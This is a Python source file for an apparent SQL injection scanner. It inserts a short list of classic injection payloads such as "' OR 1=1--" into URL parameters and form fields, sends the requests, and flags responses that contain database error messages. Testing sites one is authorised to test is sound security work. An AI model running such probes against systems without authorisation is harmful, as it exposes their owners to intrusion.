import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "'--"
]

SQL_ERRORS = [
    "sql syntax",
    "mysql_fetch",
    "ora-",
    "syntax error",
    "unclosed quotation",
    "quoted string not properly terminated"
]

class SQLiScanner:
    def __init__(self, urls, forms):
        self.urls = urls
        self.forms = forms
        self.vulnerabilities = []
    
    def scan(self):
        self.scan_urls()
        self.scan_forms()
        return self.vulnerabilities
    
    def scan_urls(self):
        for url in self.urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            if not params:
                continue

            for param in params:
                for payload in SQLI_PAYLOADS:
                    test_params = params.copy()
                    test_params[param] = payload

                    new_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=new_query))

                    try:
                        r = requests.get(test_url, timeout=5)
                        if self.is_vulnerable(r.text):
                            self.vulnerabilities.append({
                                "type": "SQL Injection",
                                "location": test_url,
                                "parameter": param,
                                "method": "GET"
                            })
                            print(f"[!] SQLi detected: {test_url}")
                            break
                    except requests.RequestException:
                        continue
    def scan_forms(self):
        for form in self.forms:
            url = form["action"]
            data = {}

            for input_field in form["inputs"]:
                if input_field["name"]:
                    data[input_field["name"]] = SQLI_PAYLOADS[0]
            
            try:
                if form["method"] == "post":
                    r = requests.post(url, data=data, timeout=5)
                else:
                    r = requests.get(url, params=data, timeout=5)
                
                if self.is_vulnerable(r.text):
                    self.vulnerabilities.append({
                        "type": "SQL Injection",
                        "location": url,
                        "method": form["method"].upper()
                    })
                    print(f"[!] SQLi detected in form: {url}")
            except requests.RequestException:
                continue
    
    def is_vulnerable(self, response_text):
        text = response_text.lower()
        return any(error in text for error in SQL_ERRORS)